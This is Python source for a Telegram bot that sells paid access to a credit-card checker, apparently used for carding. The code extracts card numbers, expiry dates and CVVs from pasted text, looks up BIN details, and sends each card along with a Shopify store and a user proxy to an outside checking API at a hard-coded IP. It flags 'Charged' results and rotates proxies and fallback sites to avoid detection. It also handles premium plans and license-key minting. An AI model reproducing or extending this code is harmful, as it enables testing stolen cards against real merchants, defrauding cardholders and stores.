        await status_msg.edit_text(
            premium_emoji(f"{premium_emoji('❌')} <b>Proxy test failed.</b> Please verify credentials and try again."),
            parse_mode="HTML"
        )
        return

    proxies_data = await load_json(PROXY_FILE)
    user_id_str = str(message.from_user.id)
    user_proxies = proxies_data.get(user_id_str, [])

    if any(existing.get("proxy_url") == proxy_data["proxy_url"] for existing in user_proxies):
        await status_msg.edit_text(
            premium_emoji(f"{premium_emoji('✅')} <b>Proxy already active in your database.</b>"),
            parse_mode="HTML"
        )
        await state.clear()
        return

    if len(user_proxies) >= 100:
        await status_msg.edit_text(
            premium_emoji(f"{premium_emoji('❌')} <b>Proxy limit reached (100).</b> Use <code>/rmpxy all</code> to clear."),
            parse_mode="HTML"
        )
        await state.clear()
        return

    user_proxies.append(proxy_data)
    proxies_data[user_id_str] = user_proxies
    await save_json(PROXY_FILE, proxies_data)
    await state.clear()

    await status_msg.edit_text(
        premium_emoji(
            f"{premium_emoji('✅')} <b>𝖠𝖢𝖳𝖨𝖵𝖤 𝖯𝖱𝖮𝖷𝖸 𝖲𝖠𝖵𝖤𝖣</b>\n\n"
            f"{premium_emoji('🌐')} <b>Endpoint:</b> <code>{proxy_text}</code>\n"
            f"{premium_emoji('📊')} <b>Total Proxies:</b> <code>{len(user_proxies)}/100</code>\n\n"
            f"{premium_emoji('🚀')} <i>You can now run Shopify gates.</i>"
        ),
        parse_mode="HTML"
    )

@aiogram_router.callback_query(F.data == "info_back")
async def callback_info_back(callback: CallbackQuery):
    viewer_id = callback.from_user.id
    uid_to_query = INFO_VIEW_CACHE.get(viewer_id, viewer_id)
    user_hits_data, id_to_name_map, _, _, _ = await parse_cc_log()
    reg_data = await get_user_registration(uid_to_query)
    user_name = (reg_data.get("first_name") if reg_data else None) or id_to_name_map.get(str(uid_to_query), "User")
    info_text = await build_info_dashboard(uid_to_query, user_name)
    await callback.message.edit_text(
        info_text,
        reply_markup=build_info_keyboard(),
        parse_mode="HTML"
    )
    await callback.answer()

@aiogram_router.message(Command("auth"))
async def aiogram_auth_start(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        await message.answer(
            premium_emoji("⚠️ <b>𝖭𝖮𝖳𝖨𝖢𝖤:</b> <code>Only administrators can use the authorization tool.</code>"),
            parse_mode="HTML"
        )
        return

    await state.clear()
    await state.set_state(AuthFlow.choose_plan)
    await message.answer(
        premium_emoji(
            f"{premium_emoji('🔐')} <b>𝖠𝖣𝖬𝖨𝖭 𝖠𝖴𝖳𝖧 𝖳𝖮𝖮𝖫</b>\n\n"
            f"{premium_emoji('📦')} <b>Select a premium plan to authorize:</b>"
        ),
        reply_markup=build_auth_plan_keyboard(),
        parse_mode="HTML"
    )

@aiogram_router.callback_query(F.data.startswith("auth_plan_"), StateFilter(AuthFlow.choose_plan))
async def callback_auth_choose_plan(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("Unauthorized.", show_alert=True)
        return

    days = int(callback.data.split("_")[-1])
    plan_label = resolve_plan_label(days)
    price = PLAN_PRICES.get(days, 0)
    await state.update_data(days=days, plan_label=plan_label, price=price, admin_id=callback.from_user.id, admin_name=callback.from_user.full_name or "Admin")
    await state.set_state(AuthFlow.enter_user_id)
    await callback.message.edit_text(
        premium_emoji(
            f"{premium_emoji('🎯')} <b>𝖯𝖫𝖠𝖭 𝖲𝖤𝖫𝖤𝖢𝖳𝖤𝖣:</b> <code>{plan_label}</code>\n"
            f"{premium_emoji('💵')} <b>Price:</b> <code>${price}</code>\n\n"
            f"{premium_emoji('🆔')} <b>Enter the target user's numeric Telegram ID:</b>"
        ),
        parse_mode="HTML"
    )
    await callback.answer()

@aiogram_router.message(StateFilter(AuthFlow.enter_user_id))
async def auth_enter_user_id(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        await state.clear()
        return

    if not message.text or not message.text.strip().isdigit():
        await message.answer(
            premium_emoji(f"{premium_emoji('⚠️')} <b>𝖭𝖮𝖳𝖨𝖢𝖤:</b> <code>Please send a valid numeric User ID.</code>"),
            parse_mode="HTML"
        )
        return

    target_user_id = int(message.text.strip())
    data = await state.get_data()
    days = data["days"]
    invoice_no = generate_invoice_number(target_user_id, days)
    card_text, expiry_str = await build_auth_summary_card(
        invoice_no, target_user_id, days, data["admin_id"], data["admin_name"]
    )
    await state.update_data(
        target_user_id=target_user_id,
        invoice_no=invoice_no,
        expiry_str=expiry_str
    )
    await state.set_state(AuthFlow.awaiting_confirmation)

    PENDING_AUTH[invoice_no] = {
        "target_user_id": target_user_id,
        "days": days,
        "plan_label": data["plan_label"],
        "price": data["price"],
        "expiry_str": expiry_str,
        "admin_id": data["admin_id"],
        "admin_name": data["admin_name"],
    }

    await message.answer(
        premium_emoji(
            f"{premium_emoji('⏳')} <b>𝖠𝖴𝖳𝖧𝖮𝖱𝖨Z𝖠𝖳𝖨𝖮𝖭 𝖯𝖤𝖭𝖣𝖨𝖭𝖦</b>\n\n"
            f"{premium_emoji('🧾')} <b>Invoice:</b> <code>{invoice_no}</code>\n"
            f"{premium_emoji('👑')} <i>Authorization card sent to owner for confirmation.</i>"
        ),
        parse_mode="HTML"
    )

    try:
        await aiogram_bot.send_message(
            OWNER_ID,
            card_text,
            reply_markup=build_auth_confirm_keyboard(invoice_no),
            parse_mode="HTML"
        )
    except Exception:
        await message.answer(
            premium_emoji(f"{premium_emoji('❌')} <b>Failed to notify owner for confirmation.</b>"),
            parse_mode="HTML"
        )
        PENDING_AUTH.pop(invoice_no, None)
        await state.clear()

@aiogram_router.callback_query(F.data.startswith("auth_confirm_"))
async def callback_auth_confirm(callback: CallbackQuery, state: FSMContext):
    if not is_owner(callback.from_user.id):
        await callback.answer("Only the owner can confirm authorization.", show_alert=True)
        return

    invoice_no = callback.data.replace("auth_confirm_", "", 1)
    data = PENDING_AUTH.pop(invoice_no, None)

    if not data:
        await callback.answer("Authorization session expired or already processed.", show_alert=True)
        return

    target_user_id = data["target_user_id"]
    days = data["days"]
    expiry_str = data["expiry_str"]
    plan_label = data["plan_label"]
    price = data["price"]
    admin_id = data["admin_id"]

    await add_premium_user(target_user_id, days)

    owner_summary = await build_auth_success_summary(invoice_no, target_user_id, days, expiry_str, plan_label, price)
    user_summary = await build_user_auth_notification(days, plan_label, expiry_str, invoice_no)

    await callback.message.edit_text(
        premium_emoji(f"{owner_summary}\n\n{premium_emoji('👑')} <i>Confirmed by owner.</i>"),
        parse_mode="HTML"
    )

    try:
        await aiogram_bot.send_message(target_user_id, user_summary, parse_mode="HTML")
    except Exception:
        pass

    if admin_id and admin_id != OWNER_ID:
        try:
            await aiogram_bot.send_message(admin_id, owner_summary, parse_mode="HTML")
        except Exception:
            pass

    await state.clear()
    await callback.answer("Authorization confirmed!", show_alert=True)

@aiogram_router.callback_query(F.data.startswith("auth_cancel_"))
async def callback_auth_cancel_invoice(callback: CallbackQuery, state: FSMContext):
    invoice_no = callback.data.replace("auth_cancel_", "", 1)
    PENDING_AUTH.pop(invoice_no, None)
    await state.clear()
    await callback.message.edit_text(
        premium_emoji(f"{premium_emoji('❌')} <b>𝖠𝖴𝖳𝖧𝖮𝖱𝖨Z𝖠𝖳𝖨𝖮𝖭 𝖢𝖠𝖭𝖢𝖤𝖫𝖤𝖣</b>\n\n{premium_emoji('🧾')} <code>{invoice_no}</code>"),
        parse_mode="HTML"
    )
    await callback.answer("Authorization cancelled.")

@aiogram_router.callback_query(F.data == "auth_cancel")
async def callback_auth_cancel(callback: CallbackQuery, state: FSMContext):
    current_state = await state.get_state()
    if current_state is None:
        await callback.answer()
        return

    await state.clear()
    await callback.message.edit_text(
        premium_emoji(f"{premium_emoji('❌')} <b>𝖠𝖴𝖳𝖧𝖮𝖱𝖨Z𝖠𝖳𝖨𝖮𝖭 𝖢𝖠𝖭𝖢𝖤𝖫𝖤𝖣</b>"),
        parse_mode="HTML"
    )
    await callback.answer("Authorization cancelled.")

@aiogram_router.message(Command("key"))
async def cmd_key_generator_init(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id != OWNER_ID and user_id not in ADMIN_IDS:
        return

    await state.clear()
    await state.set_state(KeyGenFlow.choose_plan)

    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    
    # Dynamically build plan choices using premium emojis matching your design system
    for days, price in PLAN_PRICES.items():
        label = PLAN_LABELS.get(days, f"{days} DAY PLAN")
        builder.row(
            InlineKeyboardButton(
                text=f"🎁 {label} — {days}d / {price}$",
                callback_data=f"keygen_select_{days}"
            )
        )
    builder.row(
        InlineKeyboardButton(
            text="❌ Cancel Generation",
            callback_data="keygen_cancel"
        )
    )
    builder.adjust(1)

    text = (
        f"{premium_emoji('🔑')} <b>𝖫𝖨𝖢𝖤𝖭𝖲𝖤 𝖪𝖤𝖸 𝖦𝖤𝖭𝖤𝖱𝖠𝖳𝖮𝖱</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{premium_emoji('⚡')} Select the target tier subscription duration profile you want to cook up codes for below:"
    )
    await message.answer(text, reply_markup=builder.as_markup(), parse_mode="HTML")

@aiogram_router.callback_query(F.data == "keygen_cancel")
async def cancel_keygen_workflow(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text(
        f"{premium_emoji('❌')} <b>License key generation process aborted safely.</b>",
        parse_mode="HTML"
    )
    await callback.answer()

@aiogram_router.callback_query(F.data.startswith("keygen_select_"), StateFilter(KeyGenFlow.choose_plan))
async def process_plan_selection(callback: CallbackQuery, state: FSMContext):
    selected_days = int(callback.data.split("_")[2])
    await state.update_data(selected_days=selected_days)
    
    await state.set_state(KeyGenFlow.enter_amount)
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="❌ Cancel", callback_data="keygen_cancel"))
    
    plan_label = PLAN_LABELS.get(selected_days)
    text = (
        f"{premium_emoji('💎')} <b>𝖯𝖫𝖠𝖭 𝖲𝖤𝖫𝖤𝖢𝖳𝖤𝖣:</b> <code>{plan_label}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{premium_emoji('📝')} Please <b>reply by typing the total number of keys</b> you wish to generate for this batch configuration profile below:"
    )
    await callback.message.edit_text(text, reply_markup=builder.as_markup(), parse_mode="HTML")
    await callback.answer()

@aiogram_router.message(StateFilter(KeyGenFlow.enter_amount))
async def finalize_and_mint_keys(message: Message, state: FSMContext):
    user_data = await state.get_data()
    selected_days = user_data.get("selected_days")
    
    input_text = message.text.strip()
    if not input_text.isdigit():
        await message.answer(f"{premium_emoji('⚠️')} Please send a valid positive integer number.")
        return
        
    amount = int(input_text)
    if amount <= 0 or amount > 100:
        await message.answer(f"{premium_emoji('⚠️')} Batch limits enforced. Mint between 1 and 100 keys per cycle.")
        return

    await state.clear()
    
    # Mint Loop Processing
    generated_keys = []
    keys_db = await load_json(KEYS_FILE)
    
    for _ in range(amount):
        new_key = f"TANJIRO-{generate_key()}"
        keys_db[new_key] = {
            "days": selected_days,
            "status": "unused",
            "generated_by": message.from_user.id,
            "created_at": datetime.datetime.now().isoformat()
        }
        generated_keys.append(new_key)
        
    await save_json(KEYS_FILE, keys_db)
    
    # Formatted UI Delivery Output Card
    plan_title = PLAN_LABELS.get(selected_days)
    key_list_str = "\n".join([f"<code>{k}</code>" for k in generated_keys])
    
    output_response = (
        f"{premium_emoji('✅')} <b>𝖡𝖠𝖳𝖢𝖧 𝖪𝖤𝖸𝖲 𝖦𝖤𝖭𝖤𝖱𝖠𝖳𝖤𝖣</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{premium_emoji('📦')} <b>Target Profile Tier:</b> <code>{plan_title} ({selected_days} Days)</code>\n"
        f"{premium_emoji('📊')} <b>Total Keys Processed:</b> <code>{amount}</code>\n\n"
        f"{premium_emoji('🚀')} <b>MINTED PREMIUM CODES:</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{key_list_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji('💡')} <i>Users can apply these using the <code>/redeem</code> tool dashboard interface.</i>"
    )
    
    await message.answer(output_response, parse_mode="HTML")

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}", ssl=SSL_CONTEXT) as res:
                if res.status != 200: return "BIN Info Not Found", "-", "-", "-", "-", "💎"
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '💎')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError: return "-", "-", "-", "-", "-", "💎"
    except Exception: return "-", "-", "-", "-", "-", "💎"

def normalize_card(text):
    if not text: return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16: cc = part
        elif len(part) == 4 and part.startswith('20'): yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '': mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '': yy = part
        elif len(part) in [3, 4] and cvv == '': cvv = part
    if cc and mm and yy and cvv: return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_json_from_response(response_text):
    if not response_text: return None
    start_index = response_text.find('{')
    if start_index == -1: return None
    brace_count = 0
    end_index = -1
    for i in range(start_index, len(response_text)):
        if response_text[i] == '{': brace_count += 1
        elif response_text[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                end_index = i
                break
    if end_index == -1: return None
    json_text = response_text[start_index:end_index + 1]
    try: return json.loads(json_text)
    except json.JSONDecodeError: return None

def is_retryable_card_response(response):
    response_text = str(response or "").strip()
    response_upper = response_text.upper()
    retry_indicators = ["GENERIC_ERROR", "PROXY DEAD", "ERROR", "NETWORK", "TIMEOUT", "TIMED OUT", "CONNECTION", "PROXY", "BAD GATEWAY", "GATEWAY TIMEOUT"]
    return any(indicator in response_upper for indicator in retry_indicators)

def is_retryable_card_check_response(response):
    response_lower = str(response or "").lower()
    card_check_retry_indicators = [
        "step 1 failed: missing stableid, buildid, or sourcetoken",
        "step 0 failed: get ",
        "/products.json?limit=250 returned status 404",
        "| declined | no response | shopify | -",
        "server is busy, please try again later",
        "http: 429"
    ]
    return is_retryable_card_response(response) or any(indicator in response_lower for indicator in card_check_retry_indicators)

def switch_to_fallback_site(all_sites, current_site):
    """Pick a random alternative site URL, or None if no fallback exists."""
    if not all_sites or len(all_sites) <= 1:
        return None
    pool = [s for s in all_sites if (s['url'] if isinstance(s, dict) else s) != current_site]
    if not pool:
        pool = all_sites
    chosen = random.choice(pool)
    site = chosen['url'] if isinstance(chosen, dict) else chosen
    if not site.startswith('http'):
        site = f'https://{site}'
    return site

def shopify_no_fallback_result(retries_used, last_error):
    return {
        "Response": "Site Dead - No fallback alternative sites available",
        "Price": "-",
        "Gate": "Shopify",
        "Status": "Maxed Out",
        "Retries": retries_used,
        "LastError": normalize_retry_reason(last_error) if last_error else last_error,
    }

def site_verify_no_fallback_result(site, attempt, last_response):
    return {
        "status": "Maxed Out",
        "response": "Site Dead - No fallback alternative sites available",
        "site": site,
        "price": "-",
        "retries": attempt,
        "last_error": normalize_retry_reason(last_response) if last_response else last_response,
    }

def format_shopii_result(response_json, retries_used=0, last_error=""):
    api_res = response_json.get('Response', 'No Response')
    price = response_json.get('Price', '-')
    if price != '-': price = f"${price}"
    gate = response_json.get('Gateway', response_json.get('Gate', 'Shopify'))
    status = api_res
    if any(k in str(api_res).lower() for k in ["charged", "order_paid", "order completed", "order_placed", "thank you", "successful", "💎"]):
        status = "Charged"
    return {
        "Response": api_res,
        "Price": price,
        "Gate": gate,
        "Status": status,
        "Retries": retries_used,
        "LastError": normalize_retry_reason(last_error) if retries_used else ""
    }
    
async def check_card_specific_site(card, site_data, user_id, should_log=False, all_sites=None):
    """Checks a CC against a specific target site (Used by MTXT and MSH)"""
    # Handle if site_data is a dictionary or just a string
    site = site_data['url'] if isinstance(site_data, dict) else site_data
    
    if not site.startswith('http'):
        site = f'https://{site}'

    last_error = "Unknown Error"

    retries_used = 0

    def finish(result):
        return attach_site_to_result(result, site)

    for attempt in range(1, MAX_RETRY_ATTEMPTS + 1):
        try:
            proxy_data = await get_user_proxy(user_id)
            if not proxy_data:
                last_error = "No Proxy Found"
                log_info("[RETRY]", f"Attempt {attempt}/{MAX_RETRY_ATTEMPTS} for Site: {site} - Reason: {last_error}")
                retries_used = attempt
                await update_site_retry_metadata(user_id, site, retries_used, last_error)
                if attempt < MAX_RETRY_ATTEMPTS:
                    new_site = switch_to_fallback_site(all_sites, site)
                    if new_site:
                        log_info("[RETRY]", f"Switching target domain immediately from {site} to {new_site}")
                        site = new_site
                        await asyncio.sleep(random.uniform(1, 2))
                        continue
                    return finish(shopify_no_fallback_result(retries_used, last_error))
                return finish({"Response": f"Retry Maxed Out after {MAX_RETRY_ATTEMPTS} attempts", "Price": "-", "Gate": "Shopify", "Status": "Maxed Out", "Retries": retries_used, "LastError": last_error})
            
            # Format proxy for the API
            ip, port, user, pw = proxy_data.get('ip'), proxy_data.get('port'), proxy_data.get('username'), proxy_data.get('password')
            proxy_str = f"{ip}:{port}:{user}:{pw}" if user else f"{ip}:{port}"
            
            api_url = 'http://80.211.141.77:8888/autto'
            params = {'site': site, 'cc': card, 'proxy': proxy_str}
            
            timeout = aiohttp.ClientTimeout(total=45)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(api_url, params=params, ssl=SSL_CONTEXT) as res:
                    response_text = await res.text()
                    
                    if should_log:
                        log_endpoint(str(res.url), "GET", res.status, response_text, card=card, site=site)

                    if res.status in [502, 504, 429]:
                        last_error = f"HTTP {res.status}: {response_text}"
                        log_info("[RETRY]", f"Attempt {attempt}/{MAX_RETRY_ATTEMPTS} for Site: {site} - Reason: {normalize_retry_reason(last_error)}")
                        retries_used = attempt
                        await update_site_retry_metadata(user_id, site, retries_used, last_error)
                        if attempt < MAX_RETRY_ATTEMPTS:
                            new_site = switch_to_fallback_site(all_sites, site)
                            if new_site:
                                log_info("[RETRY]", f"Switching target domain immediately from {site} to {new_site}")
                                site = new_site
                                await asyncio.sleep(random.uniform(1, 2))
                                continue
                            return finish(shopify_no_fallback_result(retries_used, last_error))
                        return finish({"Response": f"Retry Maxed Out after {MAX_RETRY_ATTEMPTS} attempts", "Price": "-", "Gate": "Shopify", "Status": "Maxed Out", "Retries": retries_used, "LastError": normalize_retry_reason(last_error)})
                    
                    try:
                        response_json = json.loads(response_text)
                        api_res = response_json.get('Response', 'No Response')
                        if is_retryable_card_check_response(api_res):
                            last_error = api_res
                            log_info("[RETRY]", f"Attempt {attempt}/{MAX_RETRY_ATTEMPTS} for Site: {site} - Reason: {normalize_retry_reason(last_error)}")
                            retries_used = attempt
                            await update_site_retry_metadata(user_id, site, retries_used, last_error)
                            if attempt < MAX_RETRY_ATTEMPTS:
                                new_site = switch_to_fallback_site(all_sites, site)
                                if new_site:
                                    log_info("[RETRY]", f"Switching target domain immediately from {site} to {new_site}")
                                    site = new_site
                                    await asyncio.sleep(random.uniform(1, 2))
                                    continue
                                return finish(shopify_no_fallback_result(retries_used, last_error))
                            return finish({"Response": f"Retry Maxed Out after {MAX_RETRY_ATTEMPTS} attempts", "Price": "-", "Gate": "Shopify", "Status": "Maxed Out", "Retries": retries_used, "LastError": normalize_retry_reason(last_error)})
                        return finish(format_shopii_result(response_json, retries_used, last_error))
                    except:
                        last_error = "Invalid JSON"
                        log_info("[RETRY]", f"Attempt {attempt}/{MAX_RETRY_ATTEMPTS} for Site: {site} - Reason: {last_error}")
                        retries_used = attempt
                        await update_site_retry_metadata(user_id, site, retries_used, last_error)
                        if attempt < MAX_RETRY_ATTEMPTS:
                            new_site = switch_to_fallback_site(all_sites, site)
                            if new_site:
                                log_info("[RETRY]", f"Switching target domain immediately from {site} to {new_site}")
                                site = new_site
                                await asyncio.sleep(random.uniform(1, 2))
                                continue
                            return finish(shopify_no_fallback_result(retries_used, last_error))
                        return finish({"Response": f"Retry Maxed Out after {MAX_RETRY_ATTEMPTS} attempts", "Price": "-", "Gate": "Shopify", "Status": "Maxed Out", "Retries": retries_used, "LastError": last_error})
                    
        except Exception as e:
            last_error = str(e)
            log_info("[RETRY]", f"Attempt {attempt}/{MAX_RETRY_ATTEMPTS} for Site: {site} - Reason: {normalize_retry_reason(last_error)}")
            retries_used = attempt
            await update_site_retry_metadata(user_id, site, retries_used, last_error)
            if attempt < MAX_RETRY_ATTEMPTS:
                new_site = switch_to_fallback_site(all_sites, site)
                if new_site:
                    log_info("[RETRY]", f"Switching target domain immediately from {site} to {new_site}")
                    site = new_site
                    await asyncio.sleep(random.uniform(1, 2))
                    continue
                return finish(shopify_no_fallback_result(retries_used, last_error))
            return finish({"Response": f"Retry Maxed Out after {MAX_RETRY_ATTEMPTS} attempts", "Price": "-", "Gate": "Shopify", "Status": "Maxed Out", "Retries": retries_used, "LastError": normalize_retry_reason(last_error)})

    return finish({"Response": f"Retry Maxed Out after {MAX_RETRY_ATTEMPTS} attempts", "Price": "-", "Gate": "Shopify", "Status": "Maxed Out", "Retries": retries_used, "LastError": normalize_retry_reason(last_error)})    

async def get_user_proxy(user_id):
    """Get a random proxy for a specific user"""
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(user_id), [])
    
    if not user_proxies:
        return None
    
    # Return a random proxy - user_proxies is a list, so we need to check if it's not empty
    if len(user_proxies) == 0:
        return None
    
    return random.choice(user_proxies)

async def remove_dead_proxy(user_id, proxy_url):
    """Remove a dead proxy from user's list"""
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(user_id), [])
    
    # Find and remove the dead proxy
    for proxy_data in user_proxies:
        if proxy_data['proxy_url'] == proxy_url:
            user_proxies.remove(proxy_data)
            
            if user_proxies:
                proxies[str(user_id)] = user_proxies
            else:
                del proxies[str(user_id)]
            
            await save_json(PROXY_FILE, proxies)
            break

async def get_all_user_proxies(user_id):
    """Get all proxies for a specific user"""
    proxies = await load_json(PROXY_FILE)
    return proxies.get(str(user_id), [])

async def check_card_random_site(card, sites, user_id=None):
    if not sites: return {"Response": "ERROR", "Price": "-", "Gate": "-"}, -1
    selected_data = random.choice(sites)
    site = selected_data['url'] if isinstance(selected_data, dict) else selected_data
    site_index = sites.index(selected_data) + 1
    
    if not site.startswith('http'):
        site = f'https://{site}'

    last_error = "Unknown Error"

    retries_used = 0

    for attempt in range(1, MAX_RETRY_ATTEMPTS + 1):
        try:
            proxy_data = await get_user_proxy(user_id) if user_id else None
            if not proxy_data:
                last_error = "No Proxy Found"
                log_info("[RETRY]", f"Attempt {attempt}/{MAX_RETRY_ATTEMPTS} for Site: {site} - Reason: {last_error}")
                retries_used = attempt
                await update_site_retry_metadata(user_id, site, retries_used, last_error)
                if attempt < MAX_RETRY_ATTEMPTS:
                    await asyncio.sleep(random.uniform(1, 2))
                    continue
                return {"Response": f"Retry Maxed Out after {MAX_RETRY_ATTEMPTS} attempts", "Price": "-", "Gate": "Shopify", "Status": "Maxed Out", "Retries": retries_used, "LastError": last_error}, site_index
            
            # Format proxy for the API
            ip, port, user, pw = proxy_data.get('ip'), proxy_data.get('port'), proxy_data.get('username'), proxy_data.get('password')
            proxy_str = f"{ip}:{port}:{user}:{pw}" if user else f"{ip}:{port}"
            
            api_url = 'http://80.211.141.77:8888/autto'
            params = {'site': site, 'cc': card, 'proxy': proxy_str}
            
            timeout = aiohttp.ClientTimeout(total=60)
            # 'async with' handles closing the connection automatically
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(api_url, params=params, ssl=SSL_CONTEXT) as res:
                    response_text = await res.text()
                    
                    # LOGGING (Optional: help debug)
                    log_endpoint(str(res.url), "GET", res.status, response_text, card=card, site=site)

                    if res.status in [502, 504, 429]:
                        last_error = f"HTTP {res.status}: {response_text}"
                        log_info("[RETRY]", f"Attempt {attempt}/{MAX_RETRY_ATTEMPTS} for Site: {site} - Reason: {normalize_retry_reason(last_error)}")
                        retries_used = attempt
                        await update_site_retry_metadata(user_id, site, retries_used, last_error)
                        if attempt < MAX_RETRY_ATTEMPTS:
                            await asyncio.sleep(random.uniform(1, 2))
                            continue # Pick a new proxy and try again
                        return {"Response": f"Retry Maxed Out after {MAX_RETRY_ATTEMPTS} attempts", "Price": "-", "Gate": "Shopify", "Status": "Maxed Out", "Retries": retries_used, "LastError": normalize_retry_reason(last_error)}, site_index
                    
                    try:
                        response_json = json.loads(response_text)
                    except:
                        last_error = f"Invalid JSON (HTTP {res.status})"
                        log_info("[RETRY]", f"Attempt {attempt}/{MAX_RETRY_ATTEMPTS} for Site: {site} - Reason: {last_error}")
                        retries_used = attempt
                        await update_site_retry_metadata(user_id, site, retries_used, last_error)
                        if attempt < MAX_RETRY_ATTEMPTS:
                            await asyncio.sleep(random.uniform(1, 2))
                            continue
                        return {"Response": f"Retry Maxed Out after {MAX_RETRY_ATTEMPTS} attempts", "Price": "-", "Gate": "Shopify", "Status": "Maxed Out", "Retries": retries_used, "LastError": last_error}, site_index

                    api_response = response_json.get('Response', 'No Response')
                    if is_retryable_card_check_response(api_response):
                        last_error = api_response
                        log_info("[RETRY]", f"Attempt {attempt}/{MAX_RETRY_ATTEMPTS} for Site: {site} - Reason: {normalize_retry_reason(last_error)}")
                        retries_used = attempt
                        await update_site_retry_metadata(user_id, site, retries_used, last_error)
                        if attempt < MAX_RETRY_ATTEMPTS:
                            await asyncio.sleep(random.uniform(1, 2))
                            continue
                        return {"Response": f"Retry Maxed Out after {MAX_RETRY_ATTEMPTS} attempts", "Price": "-", "Gate": "Shopify", "Status": "Maxed Out", "Retries": retries_used, "LastError": normalize_retry_reason(last_error)}, site_index
                    return format_shopii_result(response_json, retries_used, last_error), site_index
                    
        except Exception as e:
            last_error = str(e)
            log_info("[RETRY]", f"Attempt {attempt}/{MAX_RETRY_ATTEMPTS} for Site: {site} - Reason: {normalize_retry_reason(last_error)}")
            retries_used = attempt
            await update_site_retry_metadata(user_id, site, retries_used, last_error)
            if attempt < MAX_RETRY_ATTEMPTS:
                await asyncio.sleep(random.uniform(1, 2))
                continue # Try next attempt
            return {"Response": f"Retry Maxed Out after {MAX_RETRY_ATTEMPTS} attempts", "Price": "-", "Gate": "Shopify", "Status": "Maxed Out", "Retries": retries_used, "LastError": normalize_retry_reason(last_error)}, site_index

    return {"Response": f"Retry Maxed Out after {MAX_RETRY_ATTEMPTS} attempts", "Price": "-", "Gate": "Shopify", "Status": "Maxed Out", "Retries": retries_used, "LastError": normalize_retry_reason(last_error)}, site_index

class CardParser:
    def __init__(self):
        # Universal Regex: 
        # 1. (15-16 digits) 
        # 2. followed by non-digits
        # 3. (1-2 digits for month)
        # 4. followed by non-digits
        # 5. (2-4 digits for year)
        # 6. followed by non-digits
        # 7. (3-4 digits for CVV)
        self.card_pattern = re.compile(
            r'(\d{15,16})[^\d]+(\d{1,2})[^\d]+(\d{2,4})[^\d]+(\d{3,4})'
        )

    def normalize_text(self, text):
        """Converts fancy unicode fonts to standard ASCII."""
        if not text: return ""
        # Handles 𝘾𝘼𝙍𝘿 and other fancy fonts
        return unicodedata.normalize('NFKD', text).encode('ascii', 'ignore').decode('ascii')

    def parse(self, raw_text):
        """Extracts and formats card details from any messy string."""
        clean_text = self.normalize_text(raw_text)
        matches = self.card_pattern.findall(clean_text)
        
        extracted_cards = []
        for match in matches:
            n, m, y, c = match
            
            # Month: Ensure 2 digits (e.g., 5 -> 05)
            month = m.zfill(2)
            
            # Year: Ensure 2 digits (e.g., 2026 -> 26)
            year = y[-2:]
            
            # Formatting to standard pipe format
            formatted_card = f"{n}|{month}|{year}|{c}"
            extracted_cards.append(formatted_card)
            
        # Deduplicate while keeping order
        return list(dict.fromkeys(extracted_cards))

# Instantiate once
fetcher = CardParser()
def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4: yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return normalize_card(text)

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card: cards.add(card)
    return list(cards)

async def can_use(user_id, chat):
    if await is_banned_user(user_id):
        return False, "banned"

    is_premium = await is_premium_user(user_id)
    is_private = chat.id == user_id

    if is_private:
        if is_premium:
            return True, "premium_private"
        else:
            return False, "no_access"
    else:  # In a group
        if is_premium:
            return True, "premium_group"
        else:
            return True, "group_free"

def get_cc_limit(access_type, user_id=None):
    # Check if user is admin first
    if user_id and user_id in ADMIN_ID:
        return 999999999
    if access_type in ["premium_private", "premium_group"]:
        return 5000
    elif access_type == "group_free":
        return 50
    return 0

async def enforce_gate_access(event):
    user_id = event.sender_id
    chat_id = event.chat_id

    if not await is_user_registered(user_id):
        await send_gate_panel(
            chat_id,
            build_subscription_gate_text("unregistered"),
            build_subscription_gate_keyboard()
        )
        raise StopPropagation

    is_private = chat_id == user_id
    if is_private and await check_user_plan_expired(user_id):
        await send_gate_panel(
            chat_id,
            build_subscription_gate_text("expired"),
            build_subscription_gate_keyboard()
        )
        raise StopPropagation

async def enforce_shopify_proxy(event):
    if not await get_user_proxy(event.sender_id):
        await send_gate_panel(
            event.chat_id,
            build_shopify_proxy_panel_text(),
            build_shopify_proxy_keyboard()
        )
        raise StopPropagation
